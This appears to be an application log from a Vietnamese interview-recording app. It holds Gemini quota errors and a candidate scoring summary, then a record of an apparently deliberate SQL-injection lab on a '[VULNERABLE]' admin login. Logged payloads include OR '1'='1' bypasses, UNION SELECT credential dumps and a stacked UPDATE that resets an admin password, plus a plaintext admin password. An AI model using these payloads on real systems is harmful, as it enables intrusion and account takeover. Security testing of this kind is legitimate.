+google.api_core.exceptions.ResourceExhausted: 429 You exceeded your current quota, please check your plan and billing details. For more information on this error, head to: https://ai.google.dev/gemini-api/docs/rate-limits. To monitor your current usage, head to: https://ai.dev/usage?tab=rate-limit. 
+* Quota exceeded for metric: generativelanguage.googleapis.com/generate_content_free_tier_requests, limit: 20, model: gemini-2.5-flash
+Please retry in 22.971787322s. [links {
+  description: "Learn more about Gemini API quotas"
+  url: "https://ai.google.dev/gemini-api/docs/rate-limits"
+}
+, violations {
+  quota_metric: "generativelanguage.googleapis.com/generate_content_free_tier_requests"
+  quota_id: "GenerateRequestsPerDayPerProjectPerModel-FreeTier"
+  quota_dimensions {
+    key: "model"
+    value: "gemini-2.5-flash"
+  }
+  quota_dimensions {
+    key: "location"
+    value: "global"
+  }
+  quota_value: 20
+}
+, retry_delay {
+  seconds: 22
+}
+]
+
+2025-12-10 11:39:38,143 - app.services.ai_service - INFO - ✅ Layer 2 completed - Priority: MEDIUM
+2025-12-10 11:39:38,145 - app.services.ai_service - INFO - ✅ [Background] Full analysis completed for Q5
+2025-12-10 11:40:06,713 - app.services.ai_service - INFO - 🤖 Generating overall AI summary with Gemini...
+2025-12-10 11:40:07,039 - app.services.ai_service - ERROR - ❌ Error generating overall summary: 429 You exceeded your current quota, please check your plan and billing details. For more information on this error, head to: https://ai.google.dev/gemini-api/docs/rate-limits. To monitor your current usage, head to: https://ai.dev/usage?tab=rate-limit. 
+* Quota exceeded for metric: generativelanguage.googleapis.com/generate_content_free_tier_requests, limit: 20, model: gemini-2.5-flash
+Please retry in 54.066954975s. [links {
+  description: "Learn more about Gemini API quotas"
+  url: "https://ai.google.dev/gemini-api/docs/rate-limits"
+}
+, violations {
+  quota_metric: "generativelanguage.googleapis.com/generate_content_free_tier_requests"
+  quota_id: "GenerateRequestsPerDayPerProjectPerModel-FreeTier"
+  quota_dimensions {
+    key: "model"
+    value: "gemini-2.5-flash"
+  }
+  quota_dimensions {
+    key: "location"
+    value: "global"
+  }
+  quota_value: 20
+}
+, retry_delay {
+  seconds: 54
+}
+]
+2025-12-10 11:40:07,041 - app.services.ai_service - ERROR - Traceback: Traceback (most recent call last):
+  File "D:\web-interview-recorder\app\services\ai_service.py", line 535, in calculate_final_ranking
+    response = await asyncio.to_thread(
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\asyncio\threads.py", line 25, in to_thread
+    return await loop.run_in_executor(None, func_call)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\concurrent\futures\thread.py", line 58, in run
+    result = self.fn(*self.args, **self.kwargs)
+             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\site-packages\google\generativeai\generative_models.py", line 331, in generate_content
+    response = self._client.generate_content(
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\site-packages\google\ai\generativelanguage_v1beta\services\generative_service\client.py", line 835, in generate_content
+    response = rpc(
+               ^^^^
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\site-packages\google\api_core\gapic_v1\method.py", line 131, in __call__
+    return wrapped_func(*args, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\site-packages\google\api_core\retry\retry_unary.py", line 294, in retry_wrapped_func
+    return retry_target(
+           ^^^^^^^^^^^^^
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\site-packages\google\api_core\retry\retry_unary.py", line 156, in retry_target
+    next_sleep = _retry_error_helper(
+                 ^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\site-packages\google\api_core\retry\retry_base.py", line 214, in _retry_error_helper
+    raise final_exc from source_exc
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\site-packages\google\api_core\retry\retry_unary.py", line 147, in retry_target
+    result = target()
+             ^^^^^^^^
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\site-packages\google\api_core\timeout.py", line 130, in func_with_timeout
+    return func(*args, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Dell Gaming\AppData\Local\Programs\Python\Python312\Lib\site-packages\google\api_core\grpc_helpers.py", line 77, in error_remapped_callable
+    raise exceptions.from_grpc_error(exc) from exc
+google.api_core.exceptions.ResourceExhausted: 429 You exceeded your current quota, please check your plan and billing details. For more information on this error, head to: https://ai.google.dev/gemini-api/docs/rate-limits. To monitor your current usage, head to: https://ai.dev/usage?tab=rate-limit. 
+* Quota exceeded for metric: generativelanguage.googleapis.com/generate_content_free_tier_requests, limit: 20, model: gemini-2.5-flash
+Please retry in 54.066954975s. [links {
+  description: "Learn more about Gemini API quotas"
+  url: "https://ai.google.dev/gemini-api/docs/rate-limits"
+}
+, violations {
+  quota_metric: "generativelanguage.googleapis.com/generate_content_free_tier_requests"
+  quota_id: "GenerateRequestsPerDayPerProjectPerModel-FreeTier"
+  quota_dimensions {
+    key: "model"
+    value: "gemini-2.5-flash"
+  }
+  quota_dimensions {
+    key: "location"
+    value: "global"
+  }
+  quota_value: 20
+}
+, retry_delay {
+  seconds: 54
+}
+]
+
+2025-12-10 11:40:07,046 - app.services.ai_service - INFO - 📄 Full transcript saved: FULL_TRANSCRIPT.txt
+2025-12-10 11:40:07,048 - app.services.ai_service - INFO - ✅ Final ranking calculated - Priority: LOW
+2025-12-10 11:40:07,048 - app.services.ai_service - INFO - 📊 Summary: {
+  "total_questions_analyzed": 5,
+  "avg_word_count": 5.8,
+  "avg_filler_density_percent": 0.0,
+  "avg_silence_ratio_percent": 0.0,
+  "avg_wpm": 107.4,
+  "avg_focus_score": 63.2,
+  "avg_content_score": 1.33,
+  "avg_communication_score": 2.67,
+  "final_priority": "LOW",
+  "final_reason": "Ứng viên yếu - Nhiều câu trả lời kém chất lượng",
+  "priority_distribution": {
+    "HIGH": 0,
+    "MEDIUM": 1,
+    "LOW": 2
+  },
+  "overall_ai_summary": {
+    "error": "429 You exceeded your current quota, please check your plan and billing details. For more information on this error, head to: https://ai.google.dev/gemini-api/docs/rate-limits. To monitor your current usage, head to: https://ai.dev/usage?tab=rate-limit. \n* Quota exceeded for metric: generativelanguage.googleapis.com/generate_content_free_tier_requests, limit: 20, model: gemini-2.5-flash\nPlease retry in 54.066954975s. [links {\n  description: \"Learn more about Gemini API quotas\"\n  url: \"https://ai.google.dev/gemini-api/docs/rate-limits\"\n}\n, violations {\n  quota_metric: \"generativelanguage.googleapis.com/generate_content_free_tier_requests\"\n  quota_id: \"GenerateRequestsPerDayPerProjectPerModel-FreeTier\"\n  quota_dimensions {\n    key: \"model\"\n    value: \"gemini-2.5-flash\"\n  }\n  quota_dimensions {\n    key: \"location\"\n    value: \"global\"\n  }\n  quota_value: 20\n}\n, retry_delay {\n  seconds: 54\n}\n]"
+  }
+}
+2026-03-10 11:28:30,416 - app.services.ai_service - INFO - Loading Whisper model (small)...
+2026-03-10 11:28:35,481 - app.services.ai_service - INFO - ✅ Whisper loaded
+2026-03-10 11:28:35,481 - app.services.ai_service - INFO - ✅ Gemini initialized
+2026-03-10 11:33:44,729 - app.database - INFO - ✅ MySQL pool created
+2026-03-10 11:33:44,729 - app.routers - WARNING - [VULNERABLE] Executing query: SELECT id, username, username FROM admins WHERE username = 'admindangcode' AND password = 'mat_khau_sieu_kho_123'
+2026-03-10 11:35:30,813 - app.routers - WARNING - [VULNERABLE] Executing query: SELECT id, username, username FROM admins WHERE username = 'admin' OR '1'='1' AND password = ''
+2026-03-10 11:35:32,565 - app.routers - WARNING - [VULNERABLE] Executing query: SELECT id, username, username FROM admins WHERE username = 'admin' OR '1'='1' AND password = ''
+2026-03-10 11:35:48,848 - app.routers - WARNING - [VULNERABLE] Executing query: SELECT id, username, username FROM admins WHERE username = 'admin_chinh' OR '1'='1' AND password = ''
+2026-03-10 11:35:50,021 - app.routers - WARNING - [VULNERABLE] Executing query: SELECT id, username, username FROM admins WHERE username = 'admin_chinh' OR '1'='1' AND password = ''
+2026-03-10 11:36:46,699 - app.routers - WARNING - [VULNERABLE] Executing query: SELECT id, username, username FROM admins WHERE username = 'admin' OR '1'='1'' AND password = ''
+2026-03-10 11:36:46,699 - app.routers - ERROR - DB error (vulnerable login): (1064, "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' AND password = ''' at line 1")
+2026-03-10 11:36:53,359 - app.routers - WARNING - [VULNERABLE] Executing query: SELECT id, username, username FROM admins WHERE username = 'admin' OR '1'='1' --' AND password = ''
+2026-03-10 11:36:53,359 - app.routers - ERROR - DB error (vulnerable login): (1064, "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' AND password = ''' at line 1")
+2026-03-10 11:36:54,791 - app.routers - WARNING - [VULNERABLE] Executing query: SELECT id, username, username FROM admins WHERE username = 'admin' OR '1'='1' --' AND password = ''
+2026-03-10 11:36:54,791 - app.routers - ERROR - DB error (vulnerable login): (1064, "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' AND password = ''' at line 1")
+2026-03-10 11:36:54,927 - app.routers - WARNING - [VULNERABLE] Executing query: SELECT id, username, username FROM admins WHERE username = 'admin' OR '1'='1' --' AND password = ''
+2026-03-10 11:36:54,928 - app.routers - ERROR - DB error (vulnerable login): (1064, "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' AND password = ''' at line 1")
+2026-03-10 11:37:18,122 - app.routers - WARNING - [VULNERABLE] Executing query: SELECT id, username, username FROM admins WHERE username = 'admin' OR '1'='1' --' AND password = ''
+2026-03-10 11:37:18,122 - app.routers - ERROR - DB error (vulnerable login): (1064, "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' AND password = ''' at line 1")
+2026-03-10 11:37:19,948 - app.routers - WARNING - [VULNERABLE] Executing query: SELECT id, username, username FROM admins WHERE username = 'admin' OR '1'='1' --' AND password = ''
+2026-03-10 11:37:19,948 - app.routers - ERROR - DB error (vulnerable login): (1064, "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' AND password = ''' at line 1")
+2026-03-10 11:38:40,741 - app.routers - WARNING - [VULNERABLE] Executing query: SELECT id, username, username FROM admins WHERE username = '" OR "1"="1' AND password = ''
+2026-03-10 11:38:41,157 - app.routers - WARNING - [VULNERABLE] Executing query: SELECT id, username, username FROM admins WHERE username = '" OR "1"="1' AND password = ''
+2026-03-10 11:38:43,224 - app.routers - WARNING - [VULNERABLE] Executing query: SELECT id, username, username FROM admins WHERE username = '" OR "1"="1' AND password = ''
+2026-03-10 11:38:47,928 - app.routers - WARNING - [VULNERABLE] Executing query: SELECT id, username, username FROM admins WHERE username = 'admin" OR "1"="1' AND password = ''
+2026-03-10 11:39:40,318 - app.routers - WARNING - [VULNERABLE] Executing query: SELECT id, username, username FROM admins WHERE username = 'admin" OR "1"="1 #' AND password = ''
+2026-03-10 11:39:41,024 - app.routers - WARNING - [VULNERABLE] Executing query: SELECT id, username, username FROM admins WHERE username = 'admin" OR "1"="1 #' AND password = ''
+2026-03-10 11:39:41,228 - app.routers - WARNING - [VULNERABLE] Executing query: SELECT id, username, username FROM admins WHERE username = 'admin" OR "1"="1 #' AND password = ''
+2026-03-10 11:39:51,846 - app.routers - WARNING - [VULNERABLE] Executing query: SELECT id, username, username FROM admins WHERE username = 'admin" OR "1"="1" #' AND password = ''
+2026-03-10 11:39:52,020 - app.routers - WARNING - [VULNERABLE] Executing query: SELECT id, username, username FROM admins WHERE username = 'admin" OR "1"="1" #' AND password = ''
+2026-03-10 11:39:52,152 - app.routers - WARNING - [VULNERABLE] Executing query: SELECT id, username, username FROM admins WHERE username = 'admin" OR "1"="1" #' AND password = ''
+2026-03-10 11:39:52,367 - app.routers - WARNING - [VULNERABLE] Executing query: SELECT id, username, username FROM admins WHERE username = 'admin" OR "1"="1" #' AND password = ''
+2026-03-10 11:39:53,047 - app.routers - WARNING - [VULNERABLE] Executing query: SELECT id, username, username FROM admins WHERE username = 'admin" OR "1"="1" #' AND password = ''
+2026-03-10 11:39:55,414 - app.routers - WARNING - [VULNERABLE] Executing query: SELECT id, username, username FROM admins WHERE username = 'admin" OR "1"="1" #' AND password = ''
+2026-03-10 11:40:06,046 - app.routers - WARNING - [VULNERABLE] Executing query: SELECT id, username, username FROM admins WHERE username = 'admin" OR "1"="1" -- -' AND password = ''
+2026-03-10 11:40:07,937 - app.routers - WARNING - [VULNERABLE] Executing query: SELECT id, username, username FROM admins WHERE username = 'admin" OR "1"="1" -- -' AND password = ''
+2026-03-10 11:44:04,426 - app.services.ai_service - INFO - Loading Whisper model (small)...
+2026-03-10 11:44:09,073 - app.services.ai_service - INFO - ✅ Whisper loaded
+2026-03-10 11:44:09,073 - app.services.ai_service - INFO - ✅ Gemini initialized
+2026-03-10 11:45:34,834 - app.services.ai_service - INFO - Loading Whisper model (small)...
+2026-03-10 11:45:38,437 - app.services.ai_service - INFO - ✅ Whisper loaded
+2026-03-10 11:45:38,438 - app.services.ai_service - INFO - ✅ Gemini initialized
+2026-03-10 11:46:15,332 - app.database - INFO - ✅ MySQL pool created
+2026-03-10 11:46:15,332 - app.routers - WARNING - [VULNERABLE] Executing query: SELECT id, username FROM Admins WHERE username = 'admin' OR '1'='1' AND password = ''
+2026-03-10 11:46:19,994 - app.routers - WARNING - [VULNERABLE] Executing query: SELECT id, username FROM Admins WHERE username = 'admin' OR '1'='1'' AND password = ''
+2026-03-10 11:46:19,994 - app.routers - ERROR - DB error (vulnerable login): (1064, "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' AND password = ''' at line 1")
+2026-03-10 11:46:24,226 - app.routers - WARNING - [VULNERABLE] Executing query: SELECT id, username FROM Admins WHERE username = ''admin' OR '1'='1'' AND password = ''
+2026-03-10 11:46:24,227 - app.routers - ERROR - DB error (vulnerable login): (1064, "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'admin' OR '1'='1'' AND password = ''' at line 1")
+2026-03-10 11:46:24,569 - app.routers - WARNING - [VULNERABLE] Executing query: SELECT id, username FROM Admins WHERE username = ''admin' OR '1'='1'' AND password = ''
+2026-03-10 11:46:24,569 - app.routers - ERROR - DB error (vulnerable login): (1064, "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'admin' OR '1'='1'' AND password = ''' at line 1")
+2026-03-10 11:46:24,727 - app.routers - WARNING - [VULNERABLE] Executing query: SELECT id, username FROM Admins WHERE username = ''admin' OR '1'='1'' AND password = ''
+2026-03-10 11:46:24,727 - app.routers - ERROR - DB error (vulnerable login): (1064, "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'admin' OR '1'='1'' AND password = ''' at line 1")
+2026-03-10 11:46:49,420 - app.routers - WARNING - [VULNERABLE] Executing query: SELECT id, username FROM Admins WHERE username = 'admin' OR '1'='1' #' AND password = ''
+2026-03-10 11:47:17,095 - app.routers - WARNING - [VULNERABLE] Executing query: SELECT id, username FROM Admins WHERE username = 'admin" = "1"="1"' AND password = ''
+2026-03-10 11:47:21,309 - app.routers - WARNING - [VULNERABLE] Executing query: SELECT id, username FROM Admins WHERE username = 'admin" = "1"="1" --' AND password = ''
+2026-03-10 11:47:23,874 - app.routers - WARNING - [VULNERABLE] Executing query: SELECT id, username FROM Admins WHERE username = 'admin" = "1"="1" -- -' AND password = ''
+2026-03-10 11:47:28,303 - app.routers - WARNING - [VULNERABLE] Executing query: SELECT id, username FROM Admins WHERE username = 'admin" = "1"="1" #' AND password = ''
+2026-03-10 11:47:29,286 - app.routers - WARNING - [VULNERABLE] Executing query: SELECT id, username FROM Admins WHERE username = 'admin" = "1"="1" #' AND password = ''
+2026-03-10 11:47:29,475 - app.routers - WARNING - [VULNERABLE] Executing query: SELECT id, username FROM Admins WHERE username = 'admin" = "1"="1" #' AND password = ''
+2026-03-10 11:47:45,555 - app.routers - WARNING - [VULNERABLE] Executing query: SELECT id, username FROM Admins WHERE username = 'admin" OR "1"="1"' AND password = ''
+2026-03-10 11:47:48,436 - app.routers - WARNING - [VULNERABLE] Executing query: SELECT id, username FROM Admins WHERE username = 'admin" OR "1"="1' AND password = ''
+2026-03-10 11:47:52,000 - app.routers - WARNING - [VULNERABLE] Executing query: SELECT id, username FROM Admins WHERE username = 'admin" OR "1"="1" #' AND password = ''
+2026-03-10 11:47:52,529 - app.routers - WARNING - [VULNERABLE] Executing query: SELECT id, username FROM Admins WHERE username = 'admin" OR "1"="1" #' AND password = ''
+2026-03-10 11:48:14,565 - app.routers - WARNING - [VULNERABLE] Executing query: SELECT id, username FROM Admins WHERE username = 'admin" OR "1"="1"  #' AND password = ''
+2026-03-10 11:48:30,850 - app.routers - WARNING - [VULNERABLE] Executing query: SELECT id, username FROM Admins WHERE username = 'admin' OR '1'='1'  #' AND password = ''
+2026-03-10 11:49:42,489 - app.routers - WARNING - [VULNERABLE] Executing query: SELECT id, username FROM Admins WHERE username = 'admin' OR '1' = '1' -- -' AND password = ''
+2026-03-10 11:54:12,211 - app.routers - WARNING - [VULNERABLE] Executing query: SELECT id, username FROM Admins WHERE username = '' UNION SELECT 1, username, password FROM admins #' AND password = ''
+2026-03-10 11:54:12,211 - app.routers - ERROR - DB error (vulnerable login): (1222, 'The used SELECT statements have a different number of columns')
+2026-03-10 11:54:18,060 - app.routers - WARNING - [VULNERABLE] Executing query: SELECT id, username FROM Admins WHERE username = '' UNION SELECT 1, username, password FROM admins -- -' AND password = ''
+2026-03-10 11:54:18,060 - app.routers - ERROR - DB error (vulnerable login): (1222, 'The used SELECT statements have a different number of columns')
+2026-03-10 11:54:18,614 - app.routers - WARNING - [VULNERABLE] Executing query: SELECT id, username FROM Admins WHERE username = '' UNION SELECT 1, username, password FROM admins -- -' AND password = ''
+2026-03-10 11:54:18,614 - app.routers - ERROR - DB error (vulnerable login): (1222, 'The used SELECT statements have a different number of columns')
+2026-03-10 12:04:13,327 - app.services.ai_service - INFO - Loading Whisper model (small)...
+2026-03-10 12:04:17,654 - app.services.ai_service - INFO - ✅ Whisper loaded
+2026-03-10 12:04:17,654 - app.services.ai_service - INFO - ✅ Gemini initialized
+2026-03-10 12:05:28,419 - app.database - INFO - ✅ MySQL pool created
+2026-03-10 12:05:28,419 - app.routers - WARNING - [VULNERABLE] Executing query: SELECT id, username FROM Admins WHERE username = 'admin' OR '1'='1 #' AND password = ''
+2026-03-10 12:05:28,419 - app.routers - ERROR - DB error (vulnerable login): 'Connection' object has no attribute 'execute'
+2026-03-10 12:05:36,612 - app.routers - WARNING - [VULNERABLE] Executing query: SELECT id, username FROM Admins WHERE username = 'admin' OR '1'='1' #' AND password = ''
+2026-03-10 12:05:36,612 - app.routers - ERROR - DB error (vulnerable login): 'Connection' object has no attribute 'execute'
+2026-03-10 12:05:37,851 - app.routers - WARNING - [VULNERABLE] Executing query: SELECT id, username FROM Admins WHERE username = 'admin' OR '1'='1' #' AND password = ''
+2026-03-10 12:05:37,851 - app.routers - ERROR - DB error (vulnerable login): 'Connection' object has no attribute 'execute'
+2026-03-10 12:05:38,011 - app.routers - WARNING - [VULNERABLE] Executing query: SELECT id, username FROM Admins WHERE username = 'admin' OR '1'='1' #' AND password = ''
+2026-03-10 12:05:38,011 - app.routers - ERROR - DB error (vulnerable login): 'Connection' object has no attribute 'execute'
+2026-03-10 12:05:38,162 - app.routers - WARNING - [VULNERABLE] Executing query: SELECT id, username FROM Admins WHERE username = 'admin' OR '1'='1' #' AND password = ''
+2026-03-10 12:05:38,163 - app.routers - ERROR - DB error (vulnerable login): 'Connection' object has no attribute 'execute'
+2026-03-10 12:05:38,292 - app.routers - WARNING - [VULNERABLE] Executing query: SELECT id, username FROM Admins WHERE username = 'admin' OR '1'='1' #' AND password = ''
+2026-03-10 12:05:38,292 - app.routers - ERROR - DB error (vulnerable login): 'Connection' object has no attribute 'execute'
+2026-03-10 12:05:38,452 - app.routers - WARNING - [VULNERABLE] Executing query: SELECT id, username FROM Admins WHERE username = 'admin' OR '1'='1' #' AND password = ''
+2026-03-10 12:05:38,452 - app.routers - ERROR - DB error (vulnerable login): 'Connection' object has no attribute 'execute'
+2026-03-10 12:05:41,974 - app.routers - WARNING - [VULNERABLE] Executing query: SELECT id, username FROM Admins WHERE username = 'admin' OR '1'='1'  #' AND password = ''
+2026-03-10 12:05:41,974 - app.routers - ERROR - DB error (vulnerable login): 'Connection' object has no attribute 'execute'
+2026-03-10 12:05:42,282 - app.routers - WARNING - [VULNERABLE] Executing query: SELECT id, username FROM Admins WHERE username = 'admin' OR '1'='1'  #' AND password = ''
+2026-03-10 12:05:42,282 - app.routers - ERROR - DB error (vulnerable login): 'Connection' object has no attribute 'execute'
+2026-03-10 12:05:42,410 - app.routers - WARNING - [VULNERABLE] Executing query: SELECT id, username FROM Admins WHERE username = 'admin' OR '1'='1'  #' AND password = ''
+2026-03-10 12:05:42,410 - app.routers - ERROR - DB error (vulnerable login): 'Connection' object has no attribute 'execute'
+2026-03-10 12:05:42,538 - app.routers - WARNING - [VULNERABLE] Executing query: SELECT id, username FROM Admins WHERE username = 'admin' OR '1'='1'  #' AND password = ''
+2026-03-10 12:05:42,538 - app.routers - ERROR - DB error (vulnerable login): 'Connection' object has no attribute 'execute'
+2026-03-10 12:05:42,674 - app.routers - WARNING - [VULNERABLE] Executing query: SELECT id, username FROM Admins WHERE username = 'admin' OR '1'='1'  #' AND password = ''
+2026-03-10 12:05:42,675 - app.routers - ERROR - DB error (vulnerable login): 'Connection' object has no attribute 'execute'
+2026-03-13 16:03:40,759 - app.services.ai_service - INFO - Loading Whisper model (small)...
+2026-03-13 16:03:45,661 - app.services.ai_service - INFO - ✅ Whisper loaded
+2026-03-13 16:04:03,710 - app.services.ai_service - INFO - ✅ Gemini initialized
+2026-03-13 16:05:17,128 - app.routers - ERROR - DB error (vulnerable login): module 'pymysql.constants.CLIENT' has no attribute 'MULTI_STATMENTS'
+2026-03-13 16:05:20,864 - app.routers - ERROR - DB error (vulnerable login): module 'pymysql.constants.CLIENT' has no attribute 'MULTI_STATMENTS'
+2026-03-13 16:05:21,470 - app.routers - ERROR - DB error (vulnerable login): module 'pymysql.constants.CLIENT' has no attribute 'MULTI_STATMENTS'
+2026-03-13 16:05:21,694 - app.routers - ERROR - DB error (vulnerable login): module 'pymysql.constants.CLIENT' has no attribute 'MULTI_STATMENTS'
+2026-03-13 16:08:28,208 - app.routers - ERROR - DB error (vulnerable login): module 'pymysql.constants.CLIENT' has no attribute 'MULTI_STATMENTS'
+2026-03-13 16:08:29,210 - app.routers - ERROR - DB error (vulnerable login): module 'pymysql.constants.CLIENT' has no attribute 'MULTI_STATMENTS'
+2026-03-13 16:09:25,008 - app.services.ai_service - INFO - Loading Whisper model (small)...
+2026-03-13 16:09:29,729 - app.services.ai_service - INFO - ✅ Whisper loaded
+2026-03-13 16:09:29,730 - app.services.ai_service - INFO - ✅ Gemini initialized
+2026-03-13 16:09:39,879 - app.services.ai_service - INFO - Loading Whisper model (small)...
+2026-03-13 16:09:43,595 - app.services.ai_service - INFO - ✅ Whisper loaded
+2026-03-13 16:09:43,596 - app.services.ai_service - INFO - ✅ Gemini initialized
+2026-03-13 16:10:13,103 - app.routers - ERROR - DB error (vulnerable login): 'cryptography' package is required for sha256_password or caching_sha2_password auth methods
+2026-03-13 16:10:18,999 - app.routers - ERROR - DB error (vulnerable login): 'cryptography' package is required for sha256_password or caching_sha2_password auth methods
+2026-03-13 16:10:19,622 - app.routers - ERROR - DB error (vulnerable login): 'cryptography' package is required for sha256_password or caching_sha2_password auth methods
+2026-03-13 16:10:19,785 - app.routers - ERROR - DB error (vulnerable login): 'cryptography' package is required for sha256_password or caching_sha2_password auth methods
+2026-03-13 16:10:20,002 - app.routers - ERROR - DB error (vulnerable login): 'cryptography' package is required for sha256_password or caching_sha2_password auth methods
+2026-03-13 16:12:07,185 - app.services.ai_service - INFO - Loading Whisper model (small)...
+2026-03-13 16:12:10,564 - app.services.ai_service - INFO - ✅ Whisper loaded
+2026-03-13 16:12:10,564 - app.services.ai_service - INFO - ✅ Gemini initialized
+2026-03-13 16:12:34,786 - app.database - INFO - ✅ MySQL pool created
+2026-03-13 16:12:34,787 - app.routers - WARNING - [VULNERABLE] Executing query: SELECT id, username FROM Admins WHERE username = 'admin' OR '1'='1' #' AND password = ''
+2026-03-13 16:12:34,787 - app.routers - ERROR - DB error (vulnerable login): 'Connection' object has no attribute 'execute'
+2026-03-13 16:12:41,075 - app.routers - WARNING - [VULNERABLE] Executing query: SELECT id, username FROM Admins WHERE username = 'admin' OR '1'='1' -- -' AND password = ''
+2026-03-13 16:12:41,075 - app.routers - ERROR - DB error (vulnerable login): 'Connection' object has no attribute 'execute'
+2026-03-13 16:12:41,240 - app.routers - WARNING - [VULNERABLE] Executing query: SELECT id, username FROM Admins WHERE username = 'admin' OR '1'='1' -- -' AND password = ''
+2026-03-13 16:12:41,240 - app.routers - ERROR - DB error (vulnerable login): 'Connection' object has no attribute 'execute'
+2026-03-13 16:12:41,469 - app.routers - WARNING - [VULNERABLE] Executing query: SELECT id, username FROM Admins WHERE username = 'admin' OR '1'='1' -- -' AND password = ''
+2026-03-13 16:12:41,469 - app.routers - ERROR - DB error (vulnerable login): 'Connection' object has no attribute 'execute'
+2026-03-13 16:14:42,501 - app.services.ai_service - INFO - Loading Whisper model (small)...
+2026-03-13 16:14:45,790 - app.services.ai_service - INFO - ✅ Whisper loaded
+2026-03-13 16:14:45,790 - app.services.ai_service - INFO - ✅ Gemini initialized
+2026-03-13 16:14:59,566 - app.services.ai_service - INFO - Loading Whisper model (small)...
+2026-03-13 16:15:02,940 - app.services.ai_service - INFO - ✅ Whisper loaded
+2026-03-13 16:15:02,941 - app.services.ai_service - INFO - ✅ Gemini initialized
+2026-03-13 16:15:25,456 - app.database - INFO - ✅ MySQL pool created
+2026-03-13 16:15:25,457 - app.routers - WARNING - [VULNERABLE] Executing query: SELECT id, username FROM Admins WHERE username = 'admin' OR '1'='1' #' AND password = ''
+2026-03-13 16:15:25,457 - app.routers - ERROR - DB error (vulnerable login): 'Connection' object has no attribute 'execute'
+2026-03-13 16:17:47,574 - app.services.ai_service - INFO - Loading Whisper model (small)...
+2026-03-13 16:17:50,848 - app.services.ai_service - INFO - ✅ Whisper loaded
+2026-03-13 16:17:50,849 - app.services.ai_service - INFO - ✅ Gemini initialized
+2026-03-13 16:18:01,049 - app.services.ai_service - INFO - Loading Whisper model (small)...
+2026-03-13 16:18:04,238 - app.services.ai_service - INFO - ✅ Whisper loaded
+2026-03-13 16:18:04,239 - app.services.ai_service - INFO - ✅ Gemini initialized
+2026-03-13 16:18:22,963 - app.database - INFO - ✅ MySQL pool created
+2026-03-13 16:18:22,963 - app.routers - WARNING - [VULNERABLE] Executing query: SELECT id, username FROM Admins WHERE username = 'admin' OR '1'='1' #' AND password = ''
+2026-03-13 16:18:44,162 - app.routers - WARNING - [VULNERABLE] Executing query: SELECT id, username FROM Admins WHERE username = 'admin' OR '1'='1' #' AND password = ''
+2026-03-13 16:30:34,636 - app.services.ai_service - INFO - Loading Whisper model (small)...
+2026-03-13 16:30:37,993 - app.services.ai_service - INFO - ✅ Whisper loaded
+2026-03-13 16:30:37,993 - app.services.ai_service - INFO - ✅ Gemini initialized
+2026-03-13 16:34:12,208 - app.services.ai_service - INFO - Loading Whisper model (small)...
+2026-03-13 16:34:15,812 - app.services.ai_service - INFO - ✅ Whisper loaded
+2026-03-13 16:34:15,812 - app.services.ai_service - INFO - ✅ Gemini initialized
+2026-03-13 16:35:40,639 - app.database - INFO - ✅ MySQL pool created
+2026-03-13 16:35:40,640 - app.routers - WARNING - [VULNERABLE] Executing query: SELECT id, username FROM Admins WHERE username = 'admin'; UPDATE Admins SET password='bihack' WHERE username='admindangcode'; -- -' AND password = ''
+2026-03-13 16:36:44,431 - app.routers - WARNING - [VULNERABLE] Executing query: SELECT id, username FROM Admins WHERE username = '' UNION SELECT id, username FROM Admins -- -' AND password = ''
+2026-03-13 16:37:11,231 - app.routers - WARNING - [VULNERABLE] Executing query: SELECT id, username FROM Admins WHERE username = 'admindangcode' AND password = 'bihack'
+2026-03-13 16:38:55,147 - app.services.ai_service - INFO - Loading Whisper model (small)...
+2026-03-13 16:38:58,540 - app.services.ai_service - INFO - ✅ Whisper loaded
+2026-03-13 16:38:58,540 - app.services.ai_service - INFO - ✅ Gemini initialized
+2026-03-13 16:40:12,018 - app.database - INFO - ✅ MySQL pool created
+2026-03-13 16:40:12,018 - app.routers - WARNING - [VULNERABLE] Executing query: SELECT id, username FROM Admins WHERE username = '' UNION SELECT id, username FROM Admins -- -' AND password = ''
+2026-03-13 16:45:03,945 - app.services.ai_service - INFO - Loading Whisper model (small)...
+2026-03-13 16:45:07,717 - app.services.ai_service - INFO - ✅ Whisper loaded
+2026-03-13 16:45:07,718 - app.services.ai_service - INFO - ✅ Gemini initialized
+2026-03-13 16:45:23,839 - app.database - INFO - ✅ MySQL pool created
+2026-03-13 16:45:23,839 - app.routers - WARNING - [VULNERABLE] Executing query: SELECT id, username FROM Admins WHERE username = '' UNION SELECT id, username FROM Admins -- -' AND password = ''
